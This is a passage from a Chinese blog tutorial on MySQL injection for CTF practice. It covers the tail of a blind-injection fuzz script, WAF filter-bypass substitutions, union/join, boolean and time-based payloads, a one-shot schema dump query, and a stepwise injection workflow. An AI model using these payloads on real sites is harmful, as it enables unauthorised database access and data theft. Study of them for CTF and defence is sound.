print(key)</span><br><span class="line">                <span class="keyword">if</span> len(r.text)==self.len:</span><br><span class="line">                    data += j</span><br><span class="line">                    print(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        print(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    fuzz = Fuzz(id,submit, filter_arr,filter_str,<span class="number">690</span>)</span><br><span class="line">    fuzz.reqFlag()</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">mysql&gt; select username from users where id='0' or ((select mid(group_concat(username separator '@')from(1)for(2)) from users)='li') or '0' order by 1 desc limit 1;</span></span><br><span class="line"><span class="string">+----------+</span></span><br><span class="line"><span class="string">| username |</span></span><br><span class="line"><span class="string">+----------+</span></span><br><span class="line"><span class="string">| liyu     |</span></span><br><span class="line"><span class="string">+----------+</span></span><br><span class="line"><span class="string">1 row in set (0.00 sec)</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="0x04-其他的一些小tips"><a href="#0x04-其他的一些小tips" class="headerlink" title="0x04 其他的一些小tips"></a>0x04 其他的一些小tips</h5><h5 id="1-一些等效替代的函数-特殊符号"><a href="#1-一些等效替代的函数-特殊符号" class="headerlink" title="1.一些等效替代的函数(特殊符号)"></a>1.一些等效替代的函数(特殊符号)</h5><h6 id="字符："><a href="#字符：" class="headerlink" title="字符："></a>字符：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">空格 &lt;--&gt; %20、%0a、%0b、/**/、 @tmp:=test</span><br><span class="line">and &lt;--&gt; or</span><br><span class="line">&apos;=&apos; &lt;--&gt; &apos;like&apos; &lt;--&gt; &apos;in&apos; --&gt; &apos;regexp&apos; &lt;--&gt; &apos;rlike&apos; --&gt; &apos;&gt;&apos; &lt;--&gt; &apos;&lt;&apos;</span><br><span class="line">``` </span><br><span class="line">###### 注意：</span><br><span class="line">```text</span><br><span class="line">@tmp:=test只能用在select关键字之后，等号后面的字符串随意</span><br></pre></td></tr></table></figure>
+
+<h6 id="函数："><a href="#函数：" class="headerlink" title="函数："></a>函数：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">字符串截断函数：left()、mid()、substr()、substring()</span><br><span class="line">取ascii码函数：ord()、ascii()</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-一次性报所有表明和字段名"><a href="#2-一次性报所有表明和字段名" class="headerlink" title="2. 一次性报所有表明和字段名"></a>2. 一次性报所有表明和字段名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema&gt;=@) AND (@)IN (@:=CONCAT(@,0x0a,&apos; [ &apos;,table_schema,&apos; ] &gt;&apos;,table_name,&apos; &gt; &apos;,column_name))))x)</span><br></pre></td></tr></table></figure>
+
+<h6 id="3-Subquery-returns-more-than-1-row的解决方法"><a href="#3-Subquery-returns-more-than-1-row的解决方法" class="headerlink" title="3. Subquery returns more than 1 row的解决方法"></a>3. Subquery returns more than 1 row的解决方法</h6><h6 id="产生这个问题的原因是子查询多于一列，也就是显示为只有一列的情况下，没有使用limit语句限制，就会产生这个问题，即limt-0-1"><a href="#产生这个问题的原因是子查询多于一列，也就是显示为只有一列的情况下，没有使用limit语句限制，就会产生这个问题，即limt-0-1" class="headerlink" title="产生这个问题的原因是子查询多于一列，也就是显示为只有一列的情况下，没有使用limit语句限制，就会产生这个问题，即limt 0,1"></a>产生这个问题的原因是子查询多于一列，也就是显示为只有一列的情况下，没有使用limit语句限制，就会产生这个问题，即limt 0,1</h6><h6 id="如果我们这里的逗号被过滤了咋办？那就使用offset关键字："><a href="#如果我们这里的逗号被过滤了咋办？那就使用offset关键字：" class="headerlink" title="如果我们这里的逗号被过滤了咋办？那就使用offset关键字："></a>如果我们这里的逗号被过滤了咋办？那就使用offset关键字：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">limit 1 offset 1</span><br></pre></td></tr></table></figure>
+
+<h6 id="如果我们这里的limit被过滤了咋办？那就试试下面的几种方法："><a href="#如果我们这里的limit被过滤了咋办？那就试试下面的几种方法：" class="headerlink" title="如果我们这里的limit被过滤了咋办？那就试试下面的几种方法："></a>如果我们这里的limit被过滤了咋办？那就试试下面的几种方法：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(1) group_concat(使用的最多)</span><br><span class="line">(2) &lt;&gt;筛选(不等于)</span><br><span class="line">(3) not in</span><br><span class="line">(4) DISTINCT</span><br></pre></td></tr></table></figure>
+
+<h5 id="4-join注入"><a href="#4-join注入" class="headerlink" title="4. join注入"></a>4. join注入</h5><h6 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select * from (select 1) a join (select 2) b %23</span><br></pre></td></tr></table></figure>
+
+<h6 id="优势：过滤了逗号的情况下使用"><a href="#优势：过滤了逗号的情况下使用" class="headerlink" title="优势：过滤了逗号的情况下使用"></a>优势：过滤了逗号的情况下使用</h6><h6 id="下面的payload-别的博客处摘抄来的-适用于过滤了逗号和字段名的情况下使用"><a href="#下面的payload-别的博客处摘抄来的-适用于过滤了逗号和字段名的情况下使用" class="headerlink" title="下面的payload(别的博客处摘抄来的)适用于过滤了逗号和字段名的情况下使用"></a>下面的payload(别的博客处摘抄来的)适用于过滤了逗号和字段名的情况下使用</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">union all</span><br><span class="line">select * from(</span><br><span class="line">    (select 1)a join(</span><br><span class="line">        select F.[需要查询的字段号] from(</span><br><span class="line">            select * from [需要查询的表有多少个字段就join多少个]</span><br><span class="line">            union</span><br><span class="line">            select * from [需要查询的表] [limit子句]</span><br><span class="line">        )F-- 我们创建的虚拟表没有表名，因此定义一个别名，然后直接[别名].[字段号]查询数据</span><br><span class="line">    )b-- 同上[还差多少字段就再join多少个，以满足字段数相同的原则]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<h5 id="5-带-的注入"><a href="#5-带-的注入" class="headerlink" title="5. 带!的注入"></a>5. 带!的注入</h5><h6 id="直接看下面的payload，适用于and、or、-被过滤的情况下使用，有时候可能也会使用到，但是具体的原理不是很明白，大家可以自行google"><a href="#直接看下面的payload，适用于and、or、-被过滤的情况下使用，有时候可能也会使用到，但是具体的原理不是很明白，大家可以自行google" class="headerlink" title="直接看下面的payload，适用于and、or、^被过滤的情况下使用，有时候可能也会使用到，但是具体的原理不是很明白，大家可以自行google"></a>直接看下面的payload，适用于and、or、^被过滤的情况下使用，有时候可能也会使用到，但是具体的原理不是很明白，大家可以自行google</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=&apos;!=!!(ascii(mid((password)form(1)))==99)!=!!&apos;1&amp;passwd=dddd</span><br></pre></td></tr></table></figure>
+
+<h5 id="6-if盲注-合理利用条件"><a href="#6-if盲注-合理利用条件" class="headerlink" title="6. if盲注(合理利用条件)"></a>6. if盲注(合理利用条件)</h5><h6 id="if盲注的基本格式："><a href="#if盲注的基本格式：" class="headerlink" title="if盲注的基本格式："></a>if盲注的基本格式：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(条件,条件为真执行的语句,条件为假执行的语句)</span><br></pre></td></tr></table></figure>
+
+<h6 id="例如：-2"><a href="#例如：-2" class="headerlink" title="例如："></a>例如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; if(ascii(mid(user(),1,1))=100,sleep(5),1)</span><br></pre></td></tr></table></figure>
+
+<h6 id="结果如下："><a href="#结果如下：" class="headerlink" title="结果如下："></a>结果如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username from users where username=&apos;liyu&apos; and if(ascii(mid(user(),1,1))=114,sleep(5),1);</span><br><span class="line">Empty set (5.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h6 id="用好if盲注的关键是条件的输入，有一道BCTF的注入题的wp用的就是if盲注"><a href="#用好if盲注的关键是条件的输入，有一道BCTF的注入题的wp用的就是if盲注" class="headerlink" title="用好if盲注的关键是条件的输入，有一道BCTF的注入题的wp用的就是if盲注"></a>用好if盲注的关键是条件的输入，有一道BCTF的注入题的wp用的就是if盲注</h6><h6 id="wp链接：https-www-kingkk-com-2018-04-bctf2018-love-q"><a href="#wp链接：https-www-kingkk-com-2018-04-bctf2018-love-q" class="headerlink" title="wp链接：https://www.kingkk.com/2018/04/bctf2018-love-q/"></a>wp链接：<a href="https://www.kingkk.com/2018/04/bctf2018-love-q/" target="_blank" rel="noopener">https://www.kingkk.com/2018/04/bctf2018-love-q/</a></h6><h6 id="写博客的这位大佬巧妙利用了pow函数数值溢出的特性，使得经过if判断后的条件会报错，但是不执行该语句时语法上是没问题的"><a href="#写博客的这位大佬巧妙利用了pow函数数值溢出的特性，使得经过if判断后的条件会报错，但是不执行该语句时语法上是没问题的" class="headerlink" title="写博客的这位大佬巧妙利用了pow函数数值溢出的特性，使得经过if判断后的条件会报错，但是不执行该语句时语法上是没问题的"></a>写博客的这位大佬巧妙利用了pow函数数值溢出的特性，使得经过if判断后的条件会报错，但是不执行该语句时语法上是没问题的</h6><h6 id="原理如下："><a href="#原理如下：" class="headerlink" title="原理如下："></a>原理如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select if(1,1,pow(2,22222222222));</span><br><span class="line">+----------------------------+</span><br><span class="line">| if(1,1,pow(2,22222222222)) |</span><br><span class="line">+----------------------------+</span><br><span class="line">|                          1 |</span><br><span class="line">+----------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select if(0,1,pow(2,22222222222));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &apos;pow(2,22222222222)&apos;</span><br></pre></td></tr></table></figure>
+
+<h6 id="第一个语句为条件为真，后面一个为假。"><a href="#第一个语句为条件为真，后面一个为假。" class="headerlink" title="第一个语句为条件为真，后面一个为假。"></a>第一个语句为条件为真，后面一个为假。</h6><h6 id="像利用pow这种函数溢出的特性也不止这一个，这就需要我们靠平时的经验积累了，总之想要玩好ctf的注入题途径就是多刷题。"><a href="#像利用pow这种函数溢出的特性也不止这一个，这就需要我们靠平时的经验积累了，总之想要玩好ctf的注入题途径就是多刷题。" class="headerlink" title="像利用pow这种函数溢出的特性也不止这一个，这就需要我们靠平时的经验积累了，总之想要玩好ctf的注入题途径就是多刷题。"></a>像利用pow这种函数溢出的特性也不止这一个，这就需要我们靠平时的经验积累了，总之想要玩好ctf的注入题途径就是多刷题。</h6><h5 id="0x06-自己总结的注入流程"><a href="#0x06-自己总结的注入流程" class="headerlink" title="0x06 自己总结的注入流程"></a>0x06 自己总结的注入流程</h5><h6 id="1、先找到注入点，id-，username-，判断GET-POST-COOKIE注入"><a href="#1、先找到注入点，id-，username-，判断GET-POST-COOKIE注入" class="headerlink" title="1、先找到注入点，id=，username=，判断GET/POST/COOKIE注入"></a>1、先找到注入点，id=，username=，判断GET/POST/COOKIE注入</h6><h6 id="2、查看显示位，如果只有一个显示位在使用union注入是注意使用limit来限制显示"><a href="#2、查看显示位，如果只有一个显示位在使用union注入是注意使用limit来限制显示" class="headerlink" title="2、查看显示位，如果只有一个显示位在使用union注入是注意使用limit来限制显示"></a>2、查看显示位，如果只有一个显示位在使用union注入是注意使用limit来限制显示</h6><h6 id="3、判断字符型注入还是数字型注入（2-1，’是否正常）"><a href="#3、判断字符型注入还是数字型注入（2-1，’是否正常）" class="headerlink" title="3、判断字符型注入还是数字型注入（2-1，’是否正常）"></a>3、判断字符型注入还是数字型注入（2-1，’是否正常）</h6><h6 id="4、输入不同值查看页面是否有变化，无变化的话可以考虑采用bool时间盲注，若有报错信息优先考虑报错注入（exp，updatexml（优先采用updatexml、extractvalue报错））"><a href="#4、输入不同值查看页面是否有变化，无变化的话可以考虑采用bool时间盲注，若有报错信息优先考虑报错注入（exp，updatexml（优先采用updatexml、extractvalue报错））" class="headerlink" title="4、输入不同值查看页面是否有变化，无变化的话可以考虑采用bool时间盲注，若有报错信息优先考虑报错注入（exp，updatexml（优先采用updatexml、extractvalue报错））"></a>4、输入不同值查看页面是否有变化，无变化的话可以考虑采用bool时间盲注，若有报错信息优先考虑报错注入（exp，updatexml（优先采用updatexml、extractvalue报错））</h6><h6 id="5、先简单测试空格和注释符是否被替换了，id-1-1，id-1-231（看看能否用-、-20、-0a、-09绕过）"><a href="#5、先简单测试空格和注释符是否被替换了，id-1-1，id-1-231（看看能否用-、-20、-0a、-09绕过）" class="headerlink" title="5、先简单测试空格和注释符是否被替换了，id=1 1，id = 1%231（看看能否用/ /、%20、%0a、%09绕过）"></a>5、先简单测试空格和注释符是否被替换了，id=1 1，id = 1%231（看看能否用/ /、%20、%0a、%09绕过）</h6><h6 id="6、进行fuzz，看看那些被waf了"><a href="#6、进行fuzz，看看那些被waf了" class="headerlink" title="6、进行fuzz，看看那些被waf了"></a>6、进行fuzz，看看那些被waf了</h6><h6 id="7、若页面上没有显示waf过滤之类的提示（sql-injection-detected），就测试是否有被替换为空的字符（如：’-or-‘-’-’、’-or-‘-‘-’-，如果页面返回正常的话，则说明该字符被替换为空）"><a href="#7、若页面上没有显示waf过滤之类的提示（sql-injection-detected），就测试是否有被替换为空的字符（如：’-or-‘-’-’、’-or-‘-‘-’-，如果页面返回正常的话，则说明该字符被替换为空）" class="headerlink" title="7、若页面上没有显示waf过滤之类的提示（sql injection detected），就测试是否有被替换为空的字符（如：’ or ‘*’=’、’ or ‘-‘=’ ，如果页面返回正常的话，则说明该字符被替换为空）"></a>7、若页面上没有显示waf过滤之类的提示（sql injection detected），就测试是否有被替换为空的字符（如：’ or ‘*’=’、’ or ‘-‘=’ ，如果页面返回正常的话，则说明该字符被替换为空）</h6><h6 id="8、简单尝试双写、编码、大小写替换的方法，判断是否可以绕过"><a href="#8、简单尝试双写、编码、大小写替换的方法，判断是否可以绕过" class="headerlink" title="8、简单尝试双写、编码、大小写替换的方法，判断是否可以绕过"></a>8、简单尝试双写、编码、大小写替换的方法，判断是否可以绕过</h6><h6 id="9、确定注入方式（尽量把盲注放最后），union、报错注入、盲注"><a href="#9、确定注入方式（尽量把盲注放最后），union、报错注入、盲注" class="headerlink" title="9、确定注入方式（尽量把盲注放最后），union、报错注入、盲注"></a>9、确定注入方式（尽量把盲注放最后），union、报错注入、盲注</h6><h6 id="10、先在bp中跑一遍看是否有结果"><a href="#10、先在bp中跑一遍看是否有结果" class="headerlink" title="10、先在bp中跑一遍看是否有结果"></a>10、先在bp中跑一遍看是否有结果</h6><h6 id="11、尝试写脚本"><a href="#11、尝试写脚本" class="headerlink" title="11、尝试写脚本"></a>11、尝试写脚本</h6><h6 id="最重要的两步就是注入点并判断出注入类型，找到被过滤的函数和关键字并找到替代的函数和关键字，这就需要我们靠自己的耐心和细心还有经验的积累了。"><a href="#最重要的两步就是注入点并判断出注入类型，找到被过滤的函数和关键字并找到替代的函数和关键字，这就需要我们靠自己的耐心和细心还有经验的积累了。" class="headerlink" title="最重要的两步就是注入点并判断出注入类型，找到被过滤的函数和关键字并找到替代的函数和关键字，这就需要我们靠自己的耐心和细心还有经验的积累了。"></a>最重要的两步就是注入点并判断出注入类型，找到被过滤的函数和关键字并找到替代的函数和关键字，这就需要我们靠自己的耐心和细心还有经验的积累了。</h6><h5 id="0x07-结束语"><a href="#0x07-结束语" class="headerlink" title="0x07 结束语"></a>0x07 结束语</h5><h6 id="上面的说的那些盲注手法都是在union注入、报错注入和可回显注入都失效的情况下使用的，所以说盲注是一种通法，他也是放在最后使用的方法，如果本来环境就存在回显的点可以用union直接注入出来，还使用盲注显的有点多此一举，也浪费很多时间。所以这些方法需要根据大家遇到的实际情况进行灵活运用。"><a href="#上面的说的那些盲注手法都是在union注入、报错注入和可回显注入都失效的情况下使用的，所以说盲注是一种通法，他也是放在最后使用的方法，如果本来环境就存在回显的点可以用union直接注入出来，还使用盲注显的有点多此一举，也浪费很多时间。所以这些方法需要根据大家遇到的实际情况进行灵活运用。" class="headerlink" title="上面的说的那些盲注手法都是在union注入、报错注入和可回显注入都失效的情况下使用的，所以说盲注是一种通法，他也是放在最后使用的方法，如果本来环境就存在回显的点可以用union直接注入出来，还使用盲注显的有点多此一举，也浪费很多时间。所以这些方法需要根据大家遇到的实际情况进行灵活运用。"></a>上面的说的那些盲注手法都是在union注入、报错注入和可回显注入都失效的情况下使用的，所以说盲注是一种通法，他也是放在最后使用的方法，如果本来环境就存在回显的点可以用union直接注入出来，还使用盲注显的有点多此一举，也浪费很多时间。所以这些方法需要根据大家遇到的实际情况进行灵活运用。</h6><h5 id="0x08-其他一些不错的参考文章"><a href="#0x08-其他一些不错的参考文章" class="headerlink" title="0x08 其他一些不错的参考文章"></a>0x08 其他一些不错的参考文章</h5><h6 id="SQL注入绕过技巧"><a href="#SQL注入绕过技巧" class="headerlink" title="SQL注入绕过技巧"></a><a href="https://www.cnblogs.com/Vinson404/p/7253255.html" target="_blank" rel="noopener">SQL注入绕过技巧</a></h6><h6 id="SQLi-filter-evasion-cheat-sheet"><a href="#SQLi-filter-evasion-cheat-sheet" class="headerlink" title="SQLi filter evasion cheat sheet"></a><a href="https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/" target="_blank" rel="noopener">SQLi filter evasion cheat sheet</a></h6><h6 id="我的WafBypass之道（SQL注入篇）"><a href="#我的WafBypass之道（SQL注入篇）" class="headerlink" title="我的WafBypass之道（SQL注入篇）"></a><a href="https://xz.aliyun.com/t/368" target="_blank" rel="noopener">我的WafBypass之道（SQL注入篇）</a></h6><h6 id="sql-盲注之正则表达式攻击"><a href="#sql-盲注之正则表达式攻击" class="headerlink" title="sql 盲注之正则表达式攻击"></a><a href="https://www.cnblogs.com/lcamry/articles/5717442.html" target="_blank" rel="noopener">sql 盲注之正则表达式攻击</a></h6><h6 id="mysql无逗号的注入技巧"><a href="#mysql无逗号的注入技巧" class="headerlink" title="mysql无逗号的注入技巧"></a><a href="https://blog.csdn.net/qq_33020901/article/details/78906268" target="_blank" rel="noopener">mysql无逗号的注入技巧</a></h6><h6 id="fuzz字典"><a href="#fuzz字典" class="headerlink" title="fuzz字典"></a><a href="https://github.com/H4lo/dictionary" target="_blank" rel="noopener">fuzz字典</a></h6>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/30/2019unctf的部分web题解/" rel="next" title="2019unctf的部分web题解">
+                <i class="fa fa-chevron-left"></i> 2019unctf的部分web题解
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
+            
+              <p class="site-author-name" itemprop="name">Ljdd520</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-XOR注入"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 XOR注入</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#因为这种方法利用了异或符号，所以给他取名为xor注入。"><span class="nav-number">1.1.0.1.</span> <span class="nav-text">因为这种方法利用了异或符号，所以给他取名为xor注入。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#1-基本的注入payload"><span class="nav-number">1.1.0.2.</span> <span class="nav-text">1. 基本的注入payload</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们来分析一下这个语句的格式："><span class="nav-number">1.1.0.3.</span> <span class="nav-text">我们来分析一下这个语句的格式：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#首先我们先用-符号来分割开语句。"><span class="nav-number">1.1.0.4.</span> <span class="nav-text">首先我们先用^符号来分割开语句。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#最前面和最后面的语句都固定为真-逻辑结果都为一-，只有中间的语句不确定真假，那么整个payload的逻辑结果都由中间的语句决定，那么我们就可以用这个特性来判断盲注的结果了"><span class="nav-number">1.1.0.5.</span> <span class="nav-text">最前面和最后面的语句都固定为真(逻辑结果都为一)，只有中间的语句不确定真假，那么整个payload的逻辑结果都由中间的语句决定，那么我们就可以用这个特性来判断盲注的结果了</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这里的mid函数的使用方法："><span class="nav-number">1.1.0.6.</span> <span class="nav-text">这里的mid函数的使用方法：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#正常的用法如下，对于str字符串，从pos作为索引值位置开始，返回截取len长度的子字符串"><span class="nav-number">1.1.0.7.</span> <span class="nav-text">正常的用法如下，对于str字符串，从pos作为索引值位置开始，返回截取len长度的子字符串</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例如："><span class="nav-number">1.1.0.8.</span> <span class="nav-text">例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这里的用法是，from-1-表示从第一个位置开始截取剩下的字符串，for-1-表示从改位置起一次就截取一个字符"><span class="nav-number">1.1.0.9.</span> <span class="nav-text">这里的用法是，from(1)表示从第一个位置开始截取剩下的字符串，for(1)表示从改位置起一次就截取一个字符</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例如下面的方式："><span class="nav-number">1.1.0.10.</span> <span class="nav-text">例如下面的方式：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这里可能还有疑问：为什么这里不加for可以正常的运行呢？"><span class="nav-number">1.1.0.11.</span> <span class="nav-text">这里可能还有疑问：为什么这里不加for可以正常的运行呢？</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例如：-1"><span class="nav-number">1.1.0.12.</span> <span class="nav-text">例如：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-使用场景"><span class="nav-number">1.1.1.</span> <span class="nav-text">2. 使用场景</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#如果这里过滤了-号的话，还可以用-gt-或者-lt-代替-大小的比较"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">如果这里过滤了=号的话，还可以用&gt;或者&lt;代替(大小的比较)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如果这里过滤了-号和注释符的话，那就把最后一个引号去掉就可以和后面的引号匹配了-‘1’-’1"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">如果这里过滤了%号和注释符的话，那就把最后一个引号去掉就可以和后面的引号匹配了 ‘1’=’1</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x02-regexp注入"><span class="nav-number">1.1.2.</span> <span class="nav-text">0x02 regexp注入</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-基本注入payload"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">1. 基本注入payload</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#下面举一个例子来说明一下用法："><span class="nav-number">1.1.2.2.</span> <span class="nav-text">下面举一个例子来说明一下用法：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#首先正常的查询语句是这样的："><span class="nav-number">1.1.2.3.</span> <span class="nav-text">首先正常的查询语句是这样的：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#select-password-from-users-where-id-1"><span class="nav-number">1.1.2.4.</span> <span class="nav-text">select password from users where id=1</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#接着进行正则表达式注入，若匹配则返回1，不匹配返回0。"><span class="nav-number">1.1.2.5.</span> <span class="nav-text">接着进行正则表达式注入，若匹配则返回1，不匹配返回0。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这里的-表示pattern的开头"><span class="nav-number">1.1.2.6.</span> <span class="nav-text">这里的^表示pattern的开头</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#接下来只要一步步的判断就可以了"><span class="nav-number">1.1.2.7.</span> <span class="nav-text">接下来只要一步步的判断就可以了</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#或者regex这个关键字还可以代替where条件里的-号"><span class="nav-number">1.1.2.8.</span> <span class="nav-text">或者regex这个关键字还可以代替where条件里的=号</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-使用场景-1"><span class="nav-number">1.1.3.</span> <span class="nav-text">2. 使用场景</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#这里的-如果也被过滤了的话，可以使用-来从从后面进行匹配。"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">这里的^如果也被过滤了的话，可以使用$来从从后面进行匹配。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#详细的正则注入教程可以看这里"><span class="nav-number">1.1.3.2.</span> <span class="nav-text">详细的正则注入教程可以看这里</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x03-order-by盲注"><span class="nav-number">1.1.4.</span> <span class="nav-text">0x03 order by盲注</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-基本注入payload-1"><span class="nav-number">1.1.5.</span> <span class="nav-text">1. 基本注入payload</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#这里是order-by的用法："><span class="nav-number">1.1.5.1.</span> <span class="nav-text">这里是order by的用法：</span></a></li><li class="nav-item 